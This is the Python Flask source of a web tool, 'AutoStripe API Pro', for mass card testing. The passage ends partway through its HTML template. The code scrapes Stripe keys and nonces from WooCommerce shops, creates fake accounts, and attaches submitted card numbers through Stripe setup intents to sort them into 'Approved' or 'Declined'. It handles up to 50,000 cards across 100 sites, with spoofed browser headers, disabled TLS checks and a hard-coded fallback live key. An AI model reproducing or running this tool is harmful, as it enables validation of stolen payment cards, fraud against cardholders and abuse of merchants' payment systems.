from flask import Flask, jsonify, render_template_string, request, Response
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
import logging
import threading
import json
import csv
import io
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

mass_check_results = {}
mass_check_status = {}
results_lock = threading.Lock()

MAX_CARDS = 50000
MAX_SITES = 100
MAX_WORKERS = 50
REQUEST_TIMEOUT = 20
MAX_RETRIES = 2


def validate_domain(domain):
    if not domain:
        return None
    domain = domain.strip().lower()
    if domain.startswith("https://"):
        domain = domain[8:]
    elif domain.startswith("http://"):
        domain = domain[7:]
    domain = domain.split("/")[0]
    if not re.match(r"^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,}$", domain):
        return None
    return domain


def categorize_error(error_msg, status_code=None):
    error_msg = str(error_msg).lower()
    if status_code:
        if status_code == 404: return "Site Not Found (404)"
        elif status_code == 403: return "Access Denied (403)"
        elif status_code == 500: return "Server Error (500)"
        elif status_code == 502: return "Bad Gateway (502)"
        elif status_code == 503: return "Service Unavailable (503)"
        elif status_code == 504: return "Gateway Timeout (504)"
    if "timeout" in error_msg or "timed out" in error_msg: return "Request Timeout"
    elif "connection" in error_msg or "connect" in error_msg: return "Connection Error"
    elif "ssl" in error_msg or "certificate" in error_msg: return "SSL/Certificate Error"
    elif "dns" in error_msg or "name" in error_msg: return "DNS Resolution Failed"
    elif "refused" in error_msg: return "Connection Refused"
    elif "too many" in error_msg or "rate" in error_msg: return "Rate Limited"
    elif "nonce" in error_msg: return "Nonce Extraction Failed"
    elif "stripe key" in error_msg: return "Stripe Key Not Found"
    elif "invalid card" in error_msg: return "Invalid Card Format"
    elif "3d" in error_msg or "3ds" in error_msg: return "3D Secure Required"
    elif "insufficient" in error_msg: return "Insufficient Funds"
    elif "expired" in error_msg: return "Card Expired"
    elif "incorrect" in error_msg and "cvc" in error_msg: return "Incorrect CVC"
    elif "processing" in error_msg: return "Processing Error"
    elif "declined" in error_msg: return "Card Declined"
    else: return f"Error: {error_msg[:100]}"


def get_stripe_key(domain):
    logger.debug(f"Getting Stripe key for domain: {domain}")
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params",
        f"https://{domain}/cart/",
        f"https://{domain}/shop/",
    ]
    patterns = [
        r"pk_live_[a-zA-Z0-9_]+",
        r"pk_test_[a-zA-Z0-9_]+",
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r"var stripe = Stripe['\"]((pk_live_[^'\"]+))['\"]",
        r'"key":"(pk_test_[^"]+)"',
    ]
    for attempt in range(MAX_RETRIES):
        for url in urls_to_try:
            try:
                response = requests.get(url, headers={"User-Agent": UserAgent().random}, timeout=REQUEST_TIMEOUT, verify=False)
                if response.status_code == 200:
                    for pattern in patterns:
                        match = re.search(pattern, response.text)
                        if match:
                            key_match = re.search(r"pk_(live|test)_[a-zA-Z0-9_]+", match.group(0))
                            if key_match:
                                return key_match.group(0)
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                continue
            except Exception:
                continue
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"


def extract_nonce_from_page(html_content, domain):
    logger.debug(f"Extracting nonce from {domain}")
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{32})["\']',
        r'_ajax_nonce["\']?\s*:\s*["\']([^"\']+)["\']',
    ]
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    return None


def generate_random_credentials():
    username = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = "".join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password


def register_account(domain, session):
    logger.debug(f"Registering account on {domain}")
    try:
        reg_response = session.get(f"https://{domain}/my-account/", timeout=REQUEST_TIMEOUT, verify=False)
        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']',
        ]
        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break
        if not reg_nonce:
            return False, "Could not extract registration nonce"
        username, email, password = generate_random_credentials()
        reg_data = {
            "username": username,
            "email": email,
            "password": password,
            "woocommerce-register-nonce": reg_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={"Referer": f"https://{domain}/my-account/"},
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )
        if "Log out" in reg_result.text or "My Account" in reg_result.text:
            return True, "Registration successful"
        else:
            return False, "Registration failed"
    except requests.exceptions.Timeout:
        return False, "Registration timeout"
    except requests.exceptions.ConnectionError:
        return False, "Registration connection error"
    except Exception as e:
        return False, f"Registration error: {str(e)[:100]}"


def process_card_enhanced(domain, ccx, use_registration=True):
    logger.debug(f"Processing card for domain: {domain}")
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {"Response": "Invalid card format. Use: NUMBER|MM|YY|CVV", "Status": "Declined", "ErrorType": "Invalid Format"}
    if "20" in yy:
        yy = yy.split("20")[1]
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
    session = requests.Session()
    session.headers.update({"User-Agent": user_agent})
    stripe_key = None
    for attempt in range(MAX_RETRIES):
        stripe_key = get_stripe_key(domain)
        if stripe_key:
            break
        time.sleep(0.5)
    if not stripe_key:
        return {"Response": "Failed to obtain Stripe key", "Status": "Declined", "ErrorType": "Stripe Key Missing"}
    if use_registration:
        registered, reg_message = register_account(domain, session)
        if not registered:
            logger.warning(f"Registration failed: {reg_message}, continuing without registration")
    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/",
        f"https://{domain}/cart/",
    ]
    nonce = None
    for url in payment_urls:
        try:
            response = session.get(url, timeout=REQUEST_TIMEOUT, verify=False)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except Exception:
            continue
    if not nonce:
        return {"Response": "Failed to extract nonce from site", "Status": "Declined", "ErrorType": "Nonce Missing"}
    payment_data = {
        "type": "card",
        "card[number]": n,
        "card[cvc]": cvc,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "billing_details[address][country]": "US",
        "billing_details[address][postal_code]": "10080",
        "billing_details[name]": "Sahil Pro",
        "pasted_fields": "number",
        "payment_user_agent": f"stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent",
        "referrer": f"https://{domain}",
        "time_on_page": str(int(time.time()) % 100000),
        "key": stripe_key,
        "_stripe_version": "2024-06-20",
        "guid": str(uuid.uuid4()),
        "muid": stripe_mid,
        "sid": stripe_sid,
    }
    try:
        pm_response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=payment_data,
            headers={"User-Agent": user_agent, "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"},
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )
        pm_data = pm_response.json()
        if "id" not in pm_data:
            error_msg = pm_data.get("error", {}).get("message", "Unknown payment method error")
            return {"Response": error_msg, "Status": "Declined", "ErrorType": categorize_error(error_msg)}
        payment_method_id = pm_data["id"]
    except requests.exceptions.Timeout:
        return {"Response": "Payment method creation timeout", "Status": "Declined", "ErrorType": "Timeout"}
    except requests.exceptions.ConnectionError:
        return {"Response": "Payment method creation connection error", "Status": "Declined", "ErrorType": "Connection Error"}
    except Exception as e:
        return {"Response": f"Payment Method Creation Failed: {str(e)[:100]}", "Status": "Declined", "ErrorType": categorize_error(e)}
    endpoints = [
        {"url": f"https://{domain}/", "params": {"wc-ajax": "wc_stripe_create_and_confirm_setup_intent"}},
        {"url": f"https://{domain}/wp-admin/admin-ajax.php", "params": {}},
        {"url": f"https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "params": {}},
        {"url": f"https://{domain}/wp-admin/admin-ajax.php", "params": {"action": "wc_stripe_create_and_confirm_setup_intent"}},
    ]
    data_payloads = [
        {"action": "wc_stripe_create_and_confirm_setup_intent", "wc-stripe-payment-method": payment_method_id, "wc-stripe-payment-type": "card", "_ajax_nonce": nonce},
        {"action": "wc_stripe_create_setup_intent", "payment_method_id": payment_method_id, "_wpnonce": nonce},
        {"wc-ajax": "wc_stripe_create_and_confirm_setup_intent", "wc-stripe-payment-method": payment_method_id, "wc-stripe-payment-type": "card", "_ajax_nonce": nonce},
    ]
    last_error = None
    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                setup_response = session.post(
                    endpoint["url"],
                    params=endpoint.get("params", {}),
                    headers={"User-Agent": user_agent, "Referer": f"https://{domain}/my-account/add-payment-method/", "accept": "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": f"https://{domain}", "x-requested-with": "XMLHttpRequest"},
                    data=data_payload,
                    timeout=REQUEST_TIMEOUT,
                    verify=False,
                )
                try:
                    setup_data = setup_response.json()
                except:
                    setup_data = {"raw_response": setup_response.text[:500]}
                if setup_data.get("success", False):
                    data_status = setup_data.get("data", {}).get("status")
                    if data_status == "requires_action":
                        return {"Response": "3D Secure Authentication Required", "Status": "Declined", "ErrorType": "3D Secure"}
                    elif data_status == "succeeded":
                        return {"Response": "Card Added Successfully", "Status": "Approved"}
                    elif "error" in setup_data.get("data", {}):
                        error_msg = setup_data["data"]["error"].get("message", "Unknown error")
                        return {"Response": error_msg, "Status": "Declined", "ErrorType": categorize_error(error_msg)}
                if not setup_data.get("success") and "data" in setup_data and "error" in setup_data.get("data", {}):
                    error_msg = setup_data["data"]["error"].get("message", "Unknown error")
                    return {"Response": error_msg, "Status": "Declined", "ErrorType": categorize_error(error_msg)}
                if setup_data.get("status") in ["succeeded", "success"]:
                    return {"Response": "Card Added Successfully", "Status": "Approved"}
                if "error" in setup_data:
                    error_msg = setup_data["error"].get("message", str(setup_data["error"]))
                    last_error = {"Response": error_msg, "Status": "Declined", "ErrorType": categorize_error(error_msg)}
            except requests.exceptions.Timeout:
                last_error = {"Response": "Setup intent timeout", "Status": "Declined", "ErrorType": "Timeout"}
                continue
            except requests.exceptions.ConnectionError:
                last_error = {"Response": "Setup intent connection error", "Status": "Declined", "ErrorType": "Connection Error"}
                continue
            except Exception as e:
                last_error = {"Response": f"Setup error: {str(e)[:100]}", "Status": "Declined", "ErrorType": categorize_error(e)}
                continue
    if last_error:
        return last_error
    return {"Response": "All payment attempts failed", "Status": "Declined", "ErrorType": "All Attempts Failed"}


def process_single_check(job_id, domain, card, card_index, total_cards):
    try:
        result = process_card_enhanced(domain, card, use_registration=True)
        result_entry = {
            "Card": card,
            "Domain": domain,
            "Response": result.get("Response", "Unknown"),
            "Status": result.get("Status", "Unknown"),
            "ErrorType": result.get("ErrorType", ""),
            "Timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "CardIndex": card_index,
        }
        with results_lock:
            if job_id not in mass_check_results:
                mass_check_results[job_id] = []
            mass_check_results[job_id].append(result_entry)
            if job_id not in mass_check_status:
                mass_check_status[job_id] = {"total": total_cards, "processed": 0, "approved": 0, "declined": 0, "errors": 0, "status": "running"}
            mass_check_status[job_id]["processed"] += 1
            if result.get("Status") == "Approved":
                mass_check_status[job_id]["approved"] += 1
            elif result.get("Status") == "Declined":
                mass_check_status[job_id]["declined"] += 1
            else:
                mass_check_status[job_id]["errors"] += 1
    except Exception as e:
        result_entry = {
            "Card": card,
            "Domain": domain,
            "Response": str(e)[:200],
            "Status": "Error",
            "ErrorType": categorize_error(e),
            "Timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "CardIndex": card_index,
        }
        with results_lock:
            if job_id not in mass_check_results:
                mass_check_results[job_id] = []
            mass_check_results[job_id].append(result_entry)
            if job_id not in mass_check_status:
                mass_check_status[job_id] = {"total": total_cards, "processed": 0, "approved": 0, "declined": 0, "errors": 0, "status": "running"}
            mass_check_status[job_id]["processed"] += 1
            mass_check_status[job_id]["errors"] += 1


def run_mass_check(job_id, domains, cards):
    total_tasks = len(domains) * len(cards)
    with results_lock:
        mass_check_status[job_id] = {"total": total_tasks, "processed": 0, "approved": 0, "declined": 0, "errors": 0, "status": "running", "start_time": time.time()}
        mass_check_results[job_id] = []
    try:
        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, total_tasks)) as executor:
            futures = []
            task_index = 0
            for domain in domains:
                for card in cards:
                    future = executor.submit(process_single_check, job_id, domain, card, task_index, total_tasks)
                    futures.append(future)
                    task_index += 1
            for future in as_completed(futures):
                try:
                    future.result(timeout=60)
                except Exception as e:
                    logger.error(f"Future error: {e}")
        with results_lock:
            mass_check_status[job_id]["status"] = "completed"
            mass_check_status[job_id]["end_time"] = time.time()
    except Exception as e:
        logger.error(f"Mass check error: {e}")
        with results_lock:
            mass_check_status[job_id]["status"] = "error"
            mass_check_status[job_id]["error_message"] = str(e)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AutoStripe API Pro</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root{--primary:#6a11cb;--secondary:#2575fc;--accent:#ff6b6b;--dark:#1a1a2e;--light:#f5f5f5;--success:#4caf50;--error:#f44336;--warning:#ff9800;--info:#2196f3;--glass:rgba(255,255,255,0.1);--glass-border:rgba(255,255,255,0.2);}
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;color:var(--light);overflow-x:hidden;position:relative;}
.bg-animation{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden;}
.bg-animation span{position:absolute;display:block;width:20px;height:20px;background:rgba(255,255,255,0.2);animation:move 25s linear infinite;bottom:-150px;}
.bg-animation span:nth-child(1){left:25%;width:80px;height:80px;animation-delay:0s;}
.bg-animation span:nth-child(2){left:10%;width:20px;height:20px;animation-delay:2s;animation-duration:12s;}
.bg-animation span:nth-child(3){left:70%;width:20px;height:20px;animation-delay:4s;}
.bg-animation span:nth-child(4){left:40%;width:60px;height:60px;animation-delay:0s;animation-duration:18s;}
.bg-animation span:nth-child(5){left:65%;width:20px;height:20px;animation-delay:0s;}
.bg-animation span:nth-child(6){left:75%;width:110px;height:110px;animation-delay:3s;}
.bg-animation span:nth-child(7){left:35%;width:150px;height:150px;animation-delay:7s;}
.bg-animation span:nth-child(8){left:50%;width:25px;height:25px;animation-delay:15s;animation-duration:45s;}
.bg-animation span:nth-child(9){left:20%;width:15px;height:15px;animation-delay:2s;animation-duration:35s;}
.bg-animation span:nth-child(10){left:85%;width:150px;height:150px;animation-delay:0s;animation-duration:11s;}
@keyframes move{0%{transform:translateY(0) rotate(0deg);opacity:1;border-radius:0;}100%{transform:translateY(-1000px) rotate(720deg);opacity:0;border-radius:50%;}}
.container{max-width:1400px;margin:0 auto;padding:20px;}
header{text-align:center;padding:40px 0;position:relative;}
.logo{display:inline-block;font-size:3rem;font-weight:700;margin-bottom:10px;background:linear-gradient(90deg,#fff,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:glow 2s ease-in-out infinite alternate;}
@keyframes glow{from{text-shadow:0 0 10px #fff,0 0 20px #fff,0 0 30px var(--primary);}to{text-shadow:0 0 20px #fff,0 0 30px var(--secondary),0 0 40px var(--secondary);}}
.tagline{font-size:1.2rem;margin-bottom:20px;opacity:0.9;}
.designer{font-size:0.9rem;opacity:0.7;margin-bottom:30px;}
.status-indicator{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:10px;animation:pulse 2s infinite;}
.status-online{background-color:var(--success);}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(76,175,80,0.7);}70%{box-shadow:0 0 0 10px rgba(76,175,80,0);}100%{box-shadow:0 0 0 0 rgba(76,175,80,0);}}
.tabs{display:flex;justify-content:center;margin-bottom:30px;flex-wrap:wrap;}
.tab{padding:12px 25px;margin:0 10px 10px;background:var(--glass);backdrop-filter:blur(10px);border:1px solid var(--glass-border);border-radius:30px;cursor:pointer;transition:all 0.3s ease;font-weight:500;}
.tab:hover{background:rgba(255,255,255,0.2);transform:translateY(-3px);}
.tab.active{background:linear-gradient(90deg,var(--primary),var(--secondary));border:1px solid transparent;}
.tab-content{display:none;}
.tab-content.active{display:block;}
.glass-card{background:var(--glass);backdrop-filter:blur(10px);border-radius:20px;padding:30px;box-shadow:0 8px 32px rgba(0,0,0,0.1);border:1px solid var(--glass-border);margin-bottom:30px;}
.form-group{margin-bottom:20px;}
.form-group label{display:block;margin-bottom:8px;font-weight:500;}
.form-group small{display:block;margin-top:5px;opacity:0.7;font-size:0.8rem;}
.form-control{width:100%;padding:15px;border-radius:10px;border:1px solid var(--glass-border);background:rgba(255,255,255,0.05);color:white;font-family:'Poppins',sans-serif;transition:all 0.3s ease;}
.form-control:focus{outline:none;border-color:var(--primary);background:rgba(255,255,255,0.1);}
.form-control::placeholder{color:rgba(255,255,255,0.7);}
textarea.form-control{min-height:150px;resize:vertical;}
.btn{display:inline-block;padding:12px 25px;border-radius:10px;border:none;font-weight:600;cursor:pointer;transition:all 0.3s ease;text-align:center;font-family:'Poppins',sans-serif;margin-right:10px;margin-bottom:10px;}
.btn-primary{background:linear-gradient(90deg,var(--primary),var(--secondary));color:white;}
.btn-primary:hover{transform:translateY(-3px);box-shadow:0 10px 20px rgba(0,0,0,0.2);}
.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none;}
.btn-secondary{background:var(--glass);color:white;border:1px solid var(--glass-border);}
.btn-secondary:hover{background:rgba(255,255,255,0.2);}
.btn-success{background:var(--success);color:white;}
.btn-success:hover{background:#45a049;}
.btn-info{background:var(--info);color:white;}
.btn-info:hover{background:#0b7dda;}
.result-container{margin-top:20px;padding:20px;border-radius:10px;background:rgba(0,0,0,0.2);display:none;}
.result-container.show{display:block;}
.result-item{padding:15px;margin-bottom:10px;border-radius:10px;background:rgba(255,255,255,0.05);border:1px solid var(--glass-border);}
.result-item.success{border-left:5px solid var(--success);}
.result-item.error{border-left:5px solid var(--error);}
.result-item.processing{border-left:5px solid var(--warning);}
.card-number{font-weight:600;margin-bottom:5px;}
.card-domain{font-size:0.85rem;opacity:0.8;margin-bottom:5px;}
.card-response{margin-bottom:5px;}
.card-status{font-weight:500;}
.card-errortype{font-size:0.8rem;opacity:0.7;margin-top:3px;}
.progress-bar{height:8px;background:rgba(255,255,255,0.1);border-radius:5px;margin-top:10px;overflow:hidden;}
.progress-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--secondary));width:0%;transition:width 0.5s ease;}
.stats{display:flex;justify-content:space-around;margin-top:20px;flex-wrap:wrap;}
.stat-item{text-align:center;padding:10px;}
.stat-value{font-size:1.5rem;font-weight:600;}
.stat-label{font-size:0.9rem;opacity:0.7;}
.notification{position:fixed;top:20px;right:20px;padding:15px 20px;border-radius:10px;color:white;font-weight:500;transform:translateX(150%);transition:transform 0.3s ease;z-index:1000;max-width:300px;}
.notification.show{transform:translateX(0);}
.notification-success{background:var(--success);}
.notification-error{background:var(--error);}
.notification-info{background:var(--primary);}
.loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s ease-in-out infinite;margin-right:10px;}
@keyframes spin{to{transform:rotate(360deg);}}
.copy-btn{background:var(--glass);border:1px solid var(--glass-border);color:white;padding:5px 10px;border-radius:5px;cursor:pointer;font-size:0.8rem;transition:all 0.3s ease;}
.copy-btn:hover{background:rgba(255,255,255,0.2);}
.filter-bar{display:flex;gap:10px;margin-bottom:15px;flex-wrap:wrap;}
.filter-bar select,.filter-bar input{padding:8px 12px;border-radius:8px;border:1px solid var(--glass-border);background:rgba(255,255,255,0.05);color:white;font-family:'Poppins',sans-serif;}
.filter-bar select option{background:var(--dark);color:white;}
.results-table{width:100%;border-collapse:collapse;margin-top:15px;font-size:0.9rem;}
.results-table th,.results-table td{padding:10px;text-align:left;border-bottom:1px solid var(--glass-border);}
.results-table th{background:rgba(255,255,255,0.05);font-weight:600;position:sticky;top:0;}
.results-table tr:hover{background:rgba(255,255,255,0.03);}
.badge{display:inline-block;padding:3px 8px;border-radius:12px;font-size:0.75rem;font-weight:600;}
.badge-success{background:rgba(76,175,80,0.2);color:#4caf50;}
.badge-error{background:rgba(244,67,54,0.2);color:#f44336;}
.badge-warning{background:rgba(255,152,0,0.2);color:#ff9800;}
.scrollable-results{max-height:500px;overflow-y:auto;border-radius:10px;background:rgba(0,0,0,0.1);padding:10px;}
.two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
@media(max-width:768px){
.two-col{grid-template-columns:1fr;}
.container{padding:10px;}
.glass-card{padding:20px;}
.tabs{flex-direction:column;align-items:center;}
.tab{width:80%;text-align:center;}
.stats{flex-direction:column;}
.stat-item{margin-bottom:15px;}
.results-table{font-size:0.8rem;}
.results-table th,.results-table td{padding:6px;}
}
footer{text-align:center;padding:30px 0;margin-top:50px;opacity:0.7;}
.live-counter{position:fixed;bottom:20px;right:20px;background:var(--glass);backdrop-filter:blur(10px);border:1px solid var(--glass-border);border-radius:15px;padding:15px 20px;z-index:999;display:none;}
.live-counter.show{display:block;}
.live-counter .counter-title{font-size:0.8rem;opacity:0.8;margin-bottom:5px;}
.live-counter .counter-value{font-size:1.2rem;font-weight:700;}
</style>
</head>
<body>
<div class="bg-animation">
<span></span><span></span><span></span><span></span><span></span>
<span></span><span></span><span></span><span></span><span></span>
</div>
<div class="container">
<header>
<div class="logo">AutoStripe API Pro</div>
<div class="tagline">Advanced Multi-Site Stripe Payment Processing</div>
<div class="designer">DEVELOPER: @diwazz | Telegram: @GatewayMaker</div>
<div><span class="status-indicator status-online"></span>API Status: Online | Max Cards: 50,000 | Max Sites: 100</div>
</header>
<div class="tabs">
<div class="tab active" onclick="switchTab('single',this)">Single Checker</div>
<div class="tab" onclick="switchTab('mass',this)">Mass Checker Pro</div>
<div class="tab" onclick="switchTab('api',this)">API Documentation</div>
</div>
<div id="single-tab" class="tab-content active">
<div class="glass-card">
<h3><i class="fas fa-credit-card"></i> Single Card Checker</h3>
<div class="form-group">
<label for="single-site">Site Domain</label>
<input type="text" id="single-site" class="form-control" placeholder="example.com">
</div>
<div class="form-group">
<label for="single-cc">Card Details</label>
<input type="text" id="single-cc" class="form-control" placeholder="4242424242424242|12|25|123">
</div>
<button class="btn btn-primary" onclick="checkSingleCard()">
<span id="single-loader" style="display:none;" class="loader"></span>Check Card
</button>
<button class="btn btn-secondary" onclick="clearSingleResults()">Clear Results</button>
<div id="single-result" class="result-container">
<h4>Result:</h4>
<div id="single-result-content"></div>
</div>
</div>
</div>
<div id="mass-tab" class="tab-content">
<div class="glass-card">
<h3><i class="fas fa-layer-group"></i> Mass Card Checker Pro</h3>
<p style="margin-bottom:15px; opacity:0.8;">Check up to <strong>50,000 cards</strong> against <strong>100 sites</strong> simultaneously.</p>
<div class="two-col">
<div class="form-group">
<label for="mass-sites">Target Sites (comma, space, or newline separated)</label>
<textarea id="mass-sites" class="form-control" placeholder="example-shop1.com&#10;example-store2.com&#10;demo-woocommerce3.com" style="min-height:120px;"></textarea>
<small>Enter one domain per line or separate with commas. Max 100 sites.</small>
</div>
<div class="form-group">
<label for="mass-cc">Card Details (One per line)</label>
<textarea id="mass-cc" class="form-control" placeholder="4242424242424242|12|25|123&#10;4000000000000002|12|25|123&#10;..." style="min-height:120px;"></textarea>
<small>Format: NUMBER|MM|YY|CVV. Max 50,000 cards.</small>
</div>
</div>
<button class="btn btn-primary" id="mass-check-btn" onclick="checkMassCards()">
<span id="mass-loader" style="display:none;" class="loader"></span>Start Mass Check
</button>
<button class="btn btn-secondary" onclick="clearMassResults()">Clear Results</button>
<button class="btn btn-success" id="export-btn" style="display:none;" onclick="exportResults()">
<i class="fas fa-download"></i> Export CSV
</button>
<button class="btn btn-info" id="export-json-btn" style="display:none;" onclick="exportJSON()">
<i class="fas fa-file-code"></i> Export JSON
</button>
<div id="mass-progress" class="progress-bar" style="display:none; margin-top:15px;">
<div id="mass-progress-fill" class="progress-fill"></div>
</div>
<div id="mass-stats" class="stats" style="display:none;">
<div class="stat-item"><div id="mass-total" class="stat-value">0</div><div class="stat-label">Total</div></div>
<div class="stat-item"><div id="mass-processed" class="stat-value">0</div><div class="stat-label">Processed</div></div>
<div class="stat-item"><div id="mass-approved" class="stat-value" style="color:var(--success);">0</div><div class="stat-label">Approved</div></div>
<div class="stat-item"><div id="mass-declined" class="stat-value" style="color:var(--error);">0</div><div class="stat-label">Declined</div></div>
<div class="stat-item"><div id="mass-errors" class="stat-value" style="color:var(--warning);">0</div><div class="stat-label">Errors</div></div>
</div>
<div id="mass-result" class="result-container" style="margin-top:20px;">
<div class="filter-bar">
<select id="filter-status" onchange="filterResults()"><option value="all">All Status</option><option value="Approved">Approved</option><option value="Declined">Declined</option><option value="Error">Error</option></select>
<select id="filter-domain" onchange="filterResults()"><option value="all">All Domains</option></select>
<input type="text" id="filter-search" placeholder="Search cards..." oninput="filterResults()">
</div>
<div class="scrollable-results">
<table class="results-table" id="results-table">
<thead><tr><th>#</th><th>Card</th><th>Domain</th><th>Response</th><th>Status</th><th>Error Type</th><th>Time</th></tr></thead>
<tbody id="mass-result-content"></tbody>
</table>
</div>
</div>
</div>
</div>
<div id="api-tab" class="tab-content">
<div class="glass-card">
<h3><i class="fas fa-book"></i> API Documentation</h3>
<div class="result-item">
<h4>Single Card Processing</h4>
<p>Process a single card payment through Stripe</p>
<div style="background:rgba(0,0,0,0.2); padding:10px; border-radius:5px; margin-top:10px; font-family:monospace; word-break:break-all;">GET /process?key=inferno&amp;site=example.com&amp;cc=card_number|mm|yy|cvv</div>
<button class="copy-btn" onclick="copyToClipboard('/process?key=inferno&amp;site=example.com&amp;cc=card_number|mm|yy|cvv')">Copy</button>
</div>
<div class="result-item">
<h4>Mass Check (Async)</h4>
<p>Start a background mass check job</p>
<div style="background:rgba(0,0,0,0.2); padding:10px; border-radius:5px; margin-top:10px; font-family:monospace; word-break:break-all;">POST /mass_check<br>Body: {"key": "inferno", "sites": ["site1.com", "site2.com"], "cards": ["cc1", "cc2"]}</div>
<button class="copy-btn" onclick="copyToClipboard('POST /mass_check with JSON body')">Copy</button>
</div>
<div class="result-item">
<h4>Check Job Status</h4>
<p>Get status of a running mass check job</p>
<div style="background:rgba(0,0,0,0.2); padding:10px; border-radius:5px; margin-top:10px; font-family:monospace; word-break:break-all;">GET /mass_status?key=inferno&amp;job_id=JOB_ID</div>
<button class="copy-btn" onclick="copyToClipboard('/mass_status?key=inferno&amp;job_id=')">Copy</button>
</div>
<div class="result-item">
<h4>Get Job Results</h4>
<p>Retrieve results of a completed mass check job</p>
<div style="background:rgba(0,0,0,0.2); padding:10px; border-radius:5px; margin-top:10px; font-family:monospace; word-break:break-all;">GET /mass_results?key=inferno&amp;job_id=JOB_ID</div>
<button class="copy-btn" onclick="copyToClipboard('/mass_results?key=inferno&amp;job_id=')">Copy</button>
</div>
<div class="result-item">
<h4>Export Results (CSV)</h4>
<p>Download results as CSV file</p>
<div style="background:rgba(0,0,0,0.2); padding:10px; border-radius:5px; margin-top:10px; font-family:monospace; word-break:break-all;">GET /export_csv?key=inferno&amp;job_id=JOB_ID</div>
<button class="copy-btn" onclick="copyToClipboard('/export_csv?key=inferno&amp;job_id=')">Copy</button>
</div>
<div class="result-item">
<h4>Health Check</h4>
<p>Check API status and availability</p>
<div style="background:rgba(0,0,0,0.2); padding:10px; border-radius:5px; margin-top:10px; font-family:monospace; word-break:break-all;">GET /health</div>
<button class="copy-btn" onclick="copyToClipboard('/health')">Copy</button>
</div>
</div>
</div>
<footer>
<p>&copy; 2026 AutoStripe API Pro. All rights reserved. | DEVELOPER: @diwazz | Telegram: @GatewayMaker</p>
</footer>
</div>
<div id="notification" class="notification"></div>
<div id="live-counter" class="live-counter">
<div class="counter-title">Live Progress</div>
